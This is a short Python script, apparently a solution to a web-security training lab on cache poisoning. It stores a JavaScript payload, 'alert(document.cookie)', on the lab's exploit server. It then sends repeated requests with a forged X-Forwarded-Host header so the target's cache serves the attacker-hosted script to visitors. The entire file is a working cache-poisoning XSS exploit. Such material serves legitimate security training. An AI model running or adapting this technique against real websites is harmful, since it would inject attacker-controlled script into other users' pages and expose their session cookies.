import time
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

session = requests.Session()
response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/resources/js/tracking.js", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8", "responseBody": "alert(document.cookie)", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

print("wait 30sek")
burp_headers = {"X-Forwarded-Host": exploit_server[8:]}

for _ in range(30):
        session.get(burp_url, headers=burp_headers)
        time.sleep(1)
